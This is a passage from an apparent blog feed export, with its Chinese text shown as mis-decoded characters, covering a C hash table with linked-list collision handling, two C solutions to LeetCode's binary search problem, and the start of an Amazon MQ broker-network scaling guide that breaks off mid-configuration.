p-&gt;next = hash_table[index];</span><br><span class="line">    hash_table[index] = p;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Lookup a person in the hash table by name</span></span><br><span class="line">person* <span class="title function_">hash_table_lookup</span><span class="params">(<span class="type">char</span> *name)</span> &#123;</span><br><span class="line">    <span class="type">int</span> index = hash(name);</span><br><span class="line">    person *tmp = hash_table[index];</span><br><span class="line">    <span class="keyword">while</span> (tmp != <span class="literal">NULL</span> &amp;&amp; <span class="built_in">strncmp</span>(tmp-&gt;name, name, MAX_NAME) != <span class="number">0</span>) &#123;</span><br><span class="line">        tmp = tmp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Delete a person from the hash table by name</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">hash_table_delete</span><span class="params">(<span class="type">char</span> *name)</span> &#123;</span><br><span class="line">    <span class="type">int</span> index = hash(name);</span><br><span class="line">    person *tmp = hash_table[index];</span><br><span class="line">    person *prev = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (tmp != <span class="literal">NULL</span> &amp;&amp; <span class="built_in">strncmp</span>(tmp-&gt;name, name, MAX_NAME) != <span class="number">0</span>) &#123;</span><br><span class="line">        prev = tmp;</span><br><span class="line">        tmp = tmp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tmp == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (prev == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        hash_table[index] = tmp-&gt;next;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        prev-&gt;next = tmp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç•¶ç™¼ç”Ÿç¢°æ’æ™‚ï¼Œé€™è£¡ä½¿ç”¨ close addressing (å³ linked list) ä¾†è§£æ±ºå•é¡Œã€‚å…·é«”å¯¦ç¾å¦‚ä¸‹ï¼š</p><p>Linked Listï¼š</p><p>æ¯å€‹ person çµæ§‹ä¸­åŒ…å«ä¸€å€‹ next æŒ‡æ¨™ï¼Œä»¥å½¢æˆ linked listã€‚<br><strong>Hash Table çš„æ¯å€‹æ§½ ( <code>hash_table[index]</code> ) éƒ½æ˜¯ä¸€å€‹ linked list çš„ Head Pointerã€‚</strong></p><ul><li>æ’å…¥æ“ä½œï¼š</li></ul><p><code>hash_table_insert</code> å‡½æ•¸åœ¨è¨ˆç®—å‡ºç´¢å¼•å¾Œï¼Œå°‡æ–°çš„ person æ’å…¥åˆ°å°æ‡‰ç´¢å¼•çš„ linked list çš„é ­éƒ¨ã€‚</p><ul><li>æŸ¥æ‰¾æ“ä½œï¼š</li></ul><p><code>hash_table_lookup</code> å‡½æ•¸ traverse æŒ‡å®šç´¢å¼•çš„ linked listï¼ŒæŸ¥æ‰¾ç‰¹å®šåç¨±çš„ personã€‚</p><ul><li>åˆªé™¤æ“ä½œï¼š</li></ul><p><code>hash_table_delete</code> å‡½æ•¸åœ¨æŒ‡å®šç´¢å¼•çš„ linked list ä¸­æŸ¥æ‰¾ä¸¦åˆªé™¤ç‰¹å®šçš„ personï¼Œä¸¦ç¶­æŒ linked list çš„çµæ§‹ã€‚<br>é€™æ¨£çš„å¯¦ç¾æ–¹æ³•ä½¿ç”¨äº† linked list ä¾†è§£æ±º Hash Table ä¸­çš„å“ˆå¸Œç¢°æ’å•é¡Œï¼Œä¿è­‰åœ¨ç™¼ç”Ÿç¢°æ’æ™‚ä¾ç„¶èƒ½æ­£ç¢ºåœ°æ’å…¥ã€æŸ¥æ‰¾å’Œåˆªé™¤è³‡æ–™ã€‚</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>[1] <a href="https://medium.com/@ralph-tech/%E8%B3%87%E6%96%99%E7%B5%90%E6%A7%8B%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98-%E9%9B%9C%E6%B9%8A%E8%A1%A8-hash-table-15f490f8ede6">https://medium.com/@ralph-tech/%E8%B3%87%E6%96%99%E7%B5%90%E6%A7%8B%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98-%E9%9B%9C%E6%B9%8A%E8%A1%A8-hash-table-15f490f8ede6</a><br>[2] <a href="https://hackmd.io/@coherent17/Sk4fomSkt#%E9%9B%9C%E6%B9%8A%E8%A1%A8Hash-table">https://hackmd.io/@coherent17/Sk4fomSkt#%E9%9B%9C%E6%B9%8A%E8%A1%A8Hash-table</a><br>[3] <a href="https://blog.techbridge.cc/2017/01/21/simple-hash-table-intro/">https://blog.techbridge.cc/2017/01/21/simple-hash-table-intro/</a><br>[4] <a href="https://haogroot.com/2022/06/19/how-to-design-hash-table/">https://haogroot.com/2022/06/19/how-to-design-hash-table/</a></p>]]></content>
      
      
      <categories>
          
          <category> LeetCodeç­†è¨˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> hash table </tag>
            
            <tag> complexity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>äºŒå…ƒæœå°‹æ³• | Easy | LeetCode#704 Binary Search</title>
      <link href="/posts/22bf447e.html"/>
      <url>/posts/22bf447e.html</url>
      
        <content type="html"><![CDATA[<h1 id="é¡Œç›®æ•˜è¿°"><a href="#é¡Œç›®æ•˜è¿°" class="headerlink" title="é¡Œç›®æ•˜è¿°"></a>é¡Œç›®æ•˜è¿°</h1><p><img src="/img/LeetCode/BS_Question.jpeg"></p><p>é¡Œç›®ä¸­æœ‰ä¸€å€‹æ•´æ•¸é™£åˆ— nums, é€™å€‹é™£åˆ—æ˜¯ä»¥æ’åºçš„é™£åˆ—ï¼Œä¸¦ä¸”åœ¨é€™ç•¶ä¸­æƒ³è¦æ‰¾åˆ° target é€™å€‹å…ƒç´ çš„ index, å¦‚æœæ²’æ‰¾åˆ°å°±å›å‚³ -1ã€‚ä¸¦ä¸”è¦æ±‚æ‰€å¯¦ç¾çš„æ¼”ç®—æ³•å…¶å¯¦æ™‚é–“è¤‡é›œåº¦ç‚º $O(Log n)$</p><h1 id="è§£æ³•"><a href="#è§£æ³•" class="headerlink" title="è§£æ³•"></a>è§£æ³•</h1><h2 id="æˆ‘çš„ä½œæ³•"><a href="#æˆ‘çš„ä½œæ³•" class="headerlink" title="æˆ‘çš„ä½œæ³•"></a>æˆ‘çš„ä½œæ³•</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// init</span></span><br><span class="line">    <span class="type">int</span> i,mid=<span class="number">0</span>,low=<span class="number">0</span>, high=numsSize<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Binary search</span></span><br><span class="line">    <span class="comment">// 1. find lower index and high index according to the length of array</span></span><br><span class="line">    <span class="comment">// 2  calculate middle value</span></span><br><span class="line">    <span class="comment">// 3. update low and high value</span></span><br><span class="line">    <span class="comment">// 4. again calcuate the new middle value until derive the target value or return -1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(low &lt;= high)&#123;</span><br><span class="line">    <span class="comment">// needs to consider the situation that the middle number is not an even number</span></span><br><span class="line">    mid = (<span class="type">int</span>)((low + high)/<span class="number">2.0</span>); </span><br><span class="line">    <span class="comment">// need to find the lower section of array</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(nums[mid] &gt; target)&#123; </span><br><span class="line">            high = mid<span class="number">-1</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(nums[mid] &lt; target)&#123;</span><br><span class="line">        low = mid+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// find value</span></span><br><span class="line">        <span class="keyword">return</span> mid;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€™é‚Šä½¿ç”¨äº† Binary Search çš„æ¨™æº–åšæ³•ï¼Œ<strong>é¦–å…ˆè¨­å®šé€²è¡Œåˆ‡åˆ†çš„ä¸­é–“å€¼ midï¼Œé€é low ä»¥åŠ high å»å–å¹³å‡ä¾†æ‰¾ä¸­é–“å€¼ã€‚</strong> æ¥è‘—æˆ‘å€‘é–‹å§‹åˆ¤æ–·ç‹€æ³:</p><ul><li>ç•¶ <code>nums[mid] &gt; target:</code> é€™å°±ä»£è¡¨ä¸­é–“å€¼å¤§æ–¼è¦æ‰¾çš„target å€¼ï¼Œ<strong>ä¹Ÿå°±æ˜¯èªªå¯ä»¥æŠŠ mid çš„å³å´éƒ¨åˆ†æ¨æ£„ï¼Œåƒ…æ‰¾å·¦å´éƒ¨åˆ†</strong>ï¼Œå› æ­¤éœ€è¦èª¿æ•´ high çš„å€¼ï¼Œä¾†ç¸®å°æŸ¥æ‰¾ç¯„åœ<ul><li><code>high = mid -1;</code></li></ul></li><li>ç•¶ <code>nums[mid] &lt; target:</code> é€™å°±ä»£è¡¨ä¸­é–“å€¼å°æ–¼è¦æ‰¾çš„target å€¼ï¼Œ<strong>ä¹Ÿå°±æ˜¯èªªå¯ä»¥æŠŠ mid çš„å·¦å´éƒ¨åˆ†æ¨æ£„ï¼Œåƒ…æ‰¾å³å´éƒ¨åˆ†</strong>ï¼Œå› æ­¤éœ€è¦èª¿æ•´ low çš„å€¼ï¼Œä¾†ç¸®å°æŸ¥æ‰¾ç¯„åœ</li><li><code>low = mid +1;</code></li><li>ç¬¬ä¸‰ç¨®ç‹€æ³å°±æ˜¯æ‰¾åˆ° <code>target</code> å€¼å°±åœ¨é™£åˆ—ä¸­ï¼Œå³å›å‚³ mid å€¼</li><li>while è¿´åœˆçš„ä¸­æ­¢æ¢ä»¶æœƒæ˜¯ <code>low &gt; high</code>ï¼Œé€™å°±ä»£è¡¨å·²ç¶“æ‰¾å¤ªå¤šéï¼Œç¢ºå®šé™£åˆ—ä¸­æ²’æœ‰targetå€¼äº†ï¼Œç›´æ¥çµæŸè¿´åœˆä¸¦ä¸” <code>return -1</code></li></ul><blockquote><p>æ³¨æ„ï¼Œåœ¨ä¸­é–“å€¼æ™‚å€™å»ºè­°æ”¹å¯«æˆ <code>mid =  low + (high -  low)/2</code> é€™æ¨£åšå¯ä»¥é¿å… high è·Ÿ low éƒ½æ˜¯è¼ƒå¤§çš„æ•¸å­—ï¼Œç›¸åŠ å°è‡´æº¢ä½çš„å•é¡Œ</p></blockquote><h2 id="åŸ·è¡Œçµæœ"><a href="#åŸ·è¡Œçµæœ" class="headerlink" title="åŸ·è¡Œçµæœ"></a>åŸ·è¡Œçµæœ</h2><p><img src="/img/LeetCode/BS_Result.png"></p><h2 id="å…¶ä»–åšæ³•-æ±‚ä¸Šç•Œ"><a href="#å…¶ä»–åšæ³•-æ±‚ä¸Šç•Œ" class="headerlink" title="å…¶ä»–åšæ³• -  æ±‚ä¸Šç•Œ"></a>å…¶ä»–åšæ³• -  æ±‚ä¸Šç•Œ</h2><p><img src="/img/LeetCode/BS_upper.png"></p><p>é€™æ˜¯åœ¨ LeetCode è§£ç­”å€çœ‹åˆ°çš„å…¶ä»–åšæ³•ï¼Œèˆ‡å…¶ç›´æ¥æ‰¾åˆ° Target æœ¬èº«ï¼Œ<strong>ä¸å¦‚å»æ‰¾èƒ½å¤  Target åœ¨é€™å€‹é™£åˆ—ä¸­èƒ½å¤ æ’å…¥çš„é»</strong></p><p>é€™å€‹è§£æ³•ä¸­é¦–å…ˆå®šç¾©äº†èƒ½è¢«æ’å…¥çš„å€å¡Šï¼Œå¦‚åŒåœ–ç‰‡ä¸­æè¿°çš„ä¸€æ¨£ï¼Œå¦‚ä¸€å€‹é™£åˆ—å‡è¨­æ˜¯ <code>[-7,-4,3,9,9,9,12]</code> é‚£ä»–æœ€å¤§èƒ½å¤ æ’å…¥çš„ä½ç½®æœƒæ˜¯åœ¨ <code>9</code> èˆ‡ <code>12</code>ä¹‹é–“ï¼Œè€Œä»–æœ€å°èƒ½å¤ æ’å…¥çš„ä½ç½®æœƒæ˜¯ <code>3</code> å’Œ <code>9</code> ä¹‹é–“ã€‚</p><p>é¦–å…ˆ ä¸€æ¨£éœ€è¦è¨ˆç®—ä¸­é–“å€¼çš„ä½ç½®ï¼Œæ¥è‘—åšåˆ¤æ–·æ™‚åˆ†åˆ¥è€ƒæ…®:</p><ul><li>ç•¶ <code>nums[mid] &lt; target:</code> é€™å°±ä»£è¡¨ä¸­é–“å€¼å°æ–¼è¦æ‰¾çš„target å€¼ï¼Œé€™æ™‚ä»£è¡¨å¯èƒ½æ’å…¥çš„ä½ç½®åœ¨ mid çš„å³å´ï¼Œå› æ­¤èª¿æ•´ low çš„ç¯„åœï¼Œç¹¼çºŒæ‰¾ä¸Šç•Œ</li><li><code>low = mid +1;</code></li><li>ç•¶ <code>nums[mid] == target:</code> é€™å°±ä»£è¡¨ä¸­é–“å€¼ç­‰æ–¼è¦æ‰¾çš„target å€¼ï¼Œæ™‚ä»£è¡¨å¯èƒ½æ’å…¥çš„ä½ç½®åœ¨ mid çš„å³å´ï¼Œå› æ­¤èª¿æ•´ low çš„ç¯„åœï¼Œç¹¼çºŒæ‰¾ä¸Šç•Œ</li><li><code>low = mid +1;</code></li><li>ç•¶ <code>nums[mid] &gt; target:</code> é€™å°±ä»£è¡¨ä¸­é–“å€¼å¤§æ–¼è¦æ‰¾çš„target å€¼ï¼Œæ™‚ä»£è¡¨å¯èƒ½æ’å…¥çš„ä½ç½®åœ¨ mid çš„å·¦å´ï¼Œå› æ­¤èª¿æ•´ high çš„ç¯„åœï¼Œç¹¼çºŒæ‰¾ä¸Šç•Œï¼Œé€™æ™‚ mid ä¹Ÿå¯èƒ½æ˜¯å¯æ’å…¥çš„ä½ç½®ï¼Œå› æ­¤ high è¨­ç‚º mid<ul><li><code>high = mid;</code></li></ul></li></ul><p>ä¸€æ—¦è¿´åœˆçµæŸï¼Œ <strong><code>high</code> ä»£è¡¨çš„æ„ç¾©æ˜¯æ’å…¥çš„ä½ç½®ï¼Œ <code>low -1</code> ä»£è¡¨çš„æ˜¯ä¸å¤§æ–¼ <code>target</code> çš„æœ€å¤§å…ƒç´ </strong> æ‰€ä»¥çµæŸå¾Œæœƒå»éœ€è¦æª¢æŸ¥ <code>nums[low-1]</code> æ˜¯å¦ç­‰æ–¼ <code>target</code>ï¼Œæœ‰å°±å›å‚³ low-1 æ²’æœ‰å°±å›å‚³ -1</p><p>æ¼”ç®—æ³•å¦‚ä¸‹:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// array init</span></span><br><span class="line">    <span class="type">int</span> i,mid=<span class="number">0</span>,low=<span class="number">0</span>, high=numsSize<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Approach-2 Find Upper Bound</span></span><br><span class="line">    <span class="keyword">while</span> (low &lt; high)&#123;</span><br><span class="line"></span><br><span class="line">        mid = low + (<span class="type">int</span>)((high-low)/<span class="number">2.0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nums[mid] &lt;= target)&#123;</span><br><span class="line">            low = mid +<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            high = mid;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( low &gt; <span class="number">0</span> &amp;&amp; target == nums[low<span class="number">-1</span>])&#123;</span><br><span class="line">        <span class="keyword">return</span> low <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>( nums[low] == target &amp;&amp; low ==<span class="number">0</span> )&#123; <span class="comment">// edge case</span></span><br><span class="line">        <span class="keyword">return</span> low;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( high == numsSize<span class="number">-1</span> &amp;&amp; target == nums[high])&#123; <span class="comment">//edge case</span></span><br><span class="line">        <span class="keyword">return</span> high;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ç‚ºä»€éº¼é€™ç¨®æ–¹æ³•èƒ½æ‰¾åˆ°ç›®æ¨™å€¼"><a href="#ç‚ºä»€éº¼é€™ç¨®æ–¹æ³•èƒ½æ‰¾åˆ°ç›®æ¨™å€¼" class="headerlink" title="ç‚ºä»€éº¼é€™ç¨®æ–¹æ³•èƒ½æ‰¾åˆ°ç›®æ¨™å€¼?"></a>ç‚ºä»€éº¼é€™ç¨®æ–¹æ³•èƒ½æ‰¾åˆ°ç›®æ¨™å€¼?</h3><ul><li><strong>åˆä½µæ¢ä»¶</strong>ï¼šåœ¨é€™ç¨®æ–¹æ³•ä¸­ï¼Œæˆ‘å€‘å°‡ nums[mid] &lt; target å’Œ nums[mid] &#x3D;&#x3D; target é€™å…©å€‹æ¢ä»¶åˆä½µäº†ï¼Œå› ç‚ºä¸ç®¡æ˜¯å°æ–¼é‚„æ˜¯ç­‰æ–¼ï¼Œç›®æ¨™å€¼çš„æ’å…¥ä½ç½®éƒ½æ‡‰è©²åœ¨ mid çš„å³å´ã€‚æ‰€ä»¥é€™æ™‚å€™éƒ½å°‡ left è¨­ç‚º mid + 1ã€‚</li><li><strong>ä¿æŒæœ‰æ•ˆç¯„åœ</strong>ï¼šå¦‚æœ nums[mid] &gt; targetï¼Œèªªæ˜ç›®æ¨™å€¼æ‡‰è©²åœ¨ mid åŠå…¶å·¦å´ï¼Œæ‰€ä»¥æˆ‘å€‘å°‡ right è¨­ç‚º midï¼Œè€Œä¸æ˜¯ mid - 1ï¼Œé€™æ¨£æˆ‘å€‘ä¿ç•™äº† mid ä½œç‚ºä¸€å€‹å¯èƒ½çš„ä½ç½®ã€‚</li><li><strong>å¾ªç’°çµæŸåˆ¤æ–·</strong>ï¼šç•¶ left å’Œ right ç›¸ç­‰æ™‚ï¼Œå¾ªç’°çµæŸï¼Œleft å³ç‚ºç›®æ¨™å€¼çš„æ’å…¥ä½ç½®ã€‚å¦‚æœç›®æ¨™å€¼åœ¨é™£åˆ—ä¸­å­˜åœ¨ï¼Œé‚£éº¼ left - 1 å³ç‚ºç›®æ¨™å€¼çš„æœ€å¾Œä¸€å€‹ä½ç½®ã€‚é€™æ™‚å€™æˆ‘å€‘åªéœ€è¦æª¢æŸ¥ nums[left - 1] æ˜¯å¦ç­‰æ–¼ç›®æ¨™å€¼å³å¯ã€‚</li></ul><h3 id="ç‰¹æ®Šç‹€æ³"><a href="#ç‰¹æ®Šç‹€æ³" class="headerlink" title="ç‰¹æ®Šç‹€æ³"></a>ç‰¹æ®Šç‹€æ³</h3><ul><li>é™£åˆ—ä¸­æ‰€æœ‰å…ƒç´ éƒ½å¤§æ–¼ç›®æ¨™å€¼ï¼šé€™ç¨®æƒ…æ³ä¸‹ï¼Œæœ€çµ‚ left æœƒç­‰æ–¼ 0ï¼Œæ­¤æ™‚èªªæ˜ç›®æ¨™å€¼ä¸å­˜åœ¨æ–¼é™£åˆ—ä¸­ã€‚</li><li>é™£åˆ—ä¸­æ‰€æœ‰å…ƒç´ éƒ½å°æ–¼ç›®æ¨™å€¼ï¼šé€™ç¨®æƒ…æ³ä¸‹ï¼Œæœ€çµ‚ left æœƒç­‰æ–¼é™£åˆ—é•·åº¦ï¼Œç›®æ¨™å€¼æ‡‰è©²æ’å…¥åœ¨é™£åˆ—çš„æœ€å¾Œä½ç½®ã€‚</li></ul><h3 id="åŸ·è¡Œçµæœ-1"><a href="#åŸ·è¡Œçµæœ-1" class="headerlink" title="åŸ·è¡Œçµæœ"></a>åŸ·è¡Œçµæœ</h3><p><img src="/img/LeetCode/BS_upper_result.png"></p><h2 id="æ™‚é–“è¤‡é›œåº¦"><a href="#æ™‚é–“è¤‡é›œåº¦" class="headerlink" title="æ™‚é–“è¤‡é›œåº¦"></a>æ™‚é–“è¤‡é›œåº¦</h2><p>åŸ·è¡Œæ­¥é©Ÿæ•¸ N -&gt; 1&#x2F;2 N -&gt; 1&#x2F;4 N -&gt; 1&#x2F;8 N â€¦ éš¨è‘— $Log n$ å‡½æ•¸æ”¶æ–‚åˆ°å®šå€¼</p>]]></content>
      
      
      <categories>
          
          <category> LeetCodeç­†è¨˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Search </tag>
            
            <tag> LeetCode </tag>
            
            <tag> Array </tag>
            
            <tag> Easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ©«å‘æ“´å±•ActiveMQ</title>
      <link href="/posts/b509904.html"/>
      <url>/posts/b509904.html</url>
      
        <content type="html"><![CDATA[<h2 id="Amazon-MQ"><a href="#Amazon-MQ" class="headerlink" title="Amazon MQ"></a>Amazon MQ</h2><p>Amzon MQ ä¸Šæœ‰è¨—ç®¡ Active MQ é€™å€‹è¨Šæ¯ä½‡åˆ—çš„æœå‹™ï¼Œè¿‘æœŸæœ‰ç¢°åˆ°å•é¡Œæ˜¯å•èªªï¼Œ<strong>è¦æ€éº¼æ¨£åœ¨ Amazon MQ ä¸Šåš Horizontal Scaling</strong>ï¼Œ</p><p>é¦–å…ˆç°¡å–®è§£é‡‹ä¸€ä¸‹ Vertical Scaling è·Ÿ Horizontal Scaling çš„å·®ç•°ã€‚</p><p>Scalingæ„å‘³è‘—æ“´å±•ï¼ŒVertical Scalingè‘—é‡æ–¼å–®ä¸€å¯¦é«”çš„é‹ç®—èƒ½åŠ›å¢å¼·ï¼Œæ‰€ä»¥Vertical Scalingå¯èƒ½æœƒæ˜¯æ›´å¥½çš„ CPU&#x2F;GPU,æ›´å¤§çš„è¨˜æ†¶é«”å®¹é‡ç­‰ç­‰ï¼Œ</p><p>ä»¥ AWS æœå‹™ä¾†èªªï¼Œå¯èƒ½æœƒæ˜¯æ›´æ›å¯¦ä¾‹ï¼ŒMQçš„è©±å°±æœƒæ˜¯å¾ <code>t3.Micro</code> æ›æˆ <code>m5.large</code></p><blockquote><p>[+] åŸ·è¡Œå€‹é«”é¡å‹ - <a href="https://docs.aws.amazon.com/zh_tw/amazon-mq/latest/developer-guide/broker-instance-types.html">https://docs.aws.amazon.com/zh_tw/amazon-mq/latest/developer-guide/broker-instance-types.html</a></p></blockquote><p>è€Œè‹¥è¦æ°´å¹³æ“´å±•ï¼Œé€šå¸¸ä»£è¡¨æ¶æ§‹æœƒæ¥æ”¶åˆ°æ›´å¤šæ¶ˆæ¯ï¼Œæ‰€ä»¥æœƒéœ€è¦æ ¹æ“šæµé‡&#x2F;è¨Šæ¯é‡ä¾†å»æ“´å±•ä¸¦ä¸”åˆ†æ“”å–®ä¸€å¯¦ä¾‹çš„è² æ“”ã€‚</p><h2 id="ActiveMQ-ä»£ç†ç¶²è·¯ï¼ˆNetwork-of-brokersï¼‰"><a href="#ActiveMQ-ä»£ç†ç¶²è·¯ï¼ˆNetwork-of-brokersï¼‰" class="headerlink" title="ActiveMQ ä»£ç†ç¶²è·¯ï¼ˆNetwork of brokersï¼‰"></a>ActiveMQ ä»£ç†ç¶²è·¯ï¼ˆNetwork of brokersï¼‰</h2><p>é€™æ˜¯ä¸€å€‹ ActiveMQ çš„åŸç”ŸåŠŸèƒ½ï¼Œä»£ç†ç¶²è·¯åŒ…å«äº†å¤šå€‹é€£æ¥åœ¨ä¸€èµ·çš„ Brokersï¼Œä»£ç†ç¨‹å¼ä¹‹é–“å¯å…±äº«æ‰€ä»£ç®¡ client ç«¯ä»¥åŠç›®æ¨™è³‡è¨Šï¼Œä»£ç†ç¨‹å¼ä¹‹é–“å¯ä»¥é€éç¶²è·¯ä¾†è·¯ç”±è³‡è¨Šã€‚</p><p>ä»£ç†ç¨‹å¼å¯ä»¥æ˜¯ï¼š</p><ul><li>Single Instance Broker (ç¯€é»å¤±æ•—æœƒç„¡æ³•ä½¿ç”¨ï¼Œé™¤éé‡æ–°å•Ÿå‹•)</li><li>Active&#x2F;Standby Brokers (ç¶²è·¯ä¸­æœ‰å¾…å‘½æ¨¡å¼çš„ brokerï¼Œå¯ä»¥å…±ç”¨å„²å­˜ç©ºé–“ï¼Œè‹¥Active ç¯€é»å¤±æ•—ï¼Œå‰‡ç”± Standby æ¥ç®¡)</li></ul><p>ä¸€èˆ¬ä¾†èªªï¼Œè‹¥æœ‰ Horizontal Scalingçš„éœ€æ±‚ï¼Œæœƒä½¿ç”¨ä»£ç†ç¶²è·¯</p><blockquote><p>[+] Amazon MQ ä»£ç†ç¨‹å¼ç¶²è·¯ - <a href="https://docs.aws.amazon.com/zh_tw/amazon-mq/latest/developer-guide/network-of-brokers.html">https://docs.aws.amazon.com/zh_tw/amazon-mq/latest/developer-guide/network-of-brokers.html</a></p></blockquote><p>ä¸‹é¢æœƒé€æ­¥å¸¶å»ºæ§‹çš„æ­¥é©Ÿ</p><h2 id="Steps"><a href="#Steps" class="headerlink" title="Steps"></a>Steps</h2><p><img src="/img/ActiveMQ/ActiveMQ1.png"></p><p><img src="/img/ActiveMQ/ActiveMQ2.png"></p><p><img src="/img/ActiveMQ/ActiveMQ3.png"></p><p><img src="/img/ActiveMQ/ActiveMQ4.png"></p><p>é¸æ“‡ <strong>Next</strong></p><p><img src="/img/ActiveMQ/ActiveMQ5.png"></p><p>é€™æ™‚å¯ä»¥ä¸‹è¼‰ CloudFormation æ¨¡æ¿ï¼Œæœªä¾†å¯ä»¥æ–¹ä¾¿ä¿®æ”¹é…ç½®é‡æ–°éƒ¨ç½²</p><p>é ä¼°éƒ¨ç½²æ‰€éœ€æ™‚é–“ï¼š <strong>25 minutes</strong></p><p><img src="/img/ActiveMQ/ActiveMQ6.png"></p><p>å¯ä»¥ç™¼ç¾ä¸‰å€‹ Broker éƒ½æ­£åœ¨éƒ¨ç½²ä¸­</p><p><img src="/img/ActiveMQ/ActiveMQ7.png"></p><p>å¯ä»¥é»é€²å» broker æŸ¥çœ‹è©³ç´°çš„è¨­å®šé…ç½®</p><p><img src="/img/ActiveMQ/ActiveMQ8.png"></p><p>åœ¨è¨­å®šæª”ç•¶ä¸­å¯ä»¥é€éç·¨è¼¯ <code>&lt;networkConnector&gt;&lt;/networkConnector&gt;</code> ç•¶ä¸­çš„å±¬æ€§é€²è¡Œ MQ æ‹“å¢£ä¸Šçš„è¨­è¨ˆ</p><p>ä»¥ä¸‹æ˜¯ç›®å‰å»ºç«‹çš„ Brokerçš„è¨­å®š</p><ul><li>Broker1 ä¸Šé¢çš„ <networkConnectors> è¨­ç½®</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;networkConnectors&gt;</span><br><span class="line">    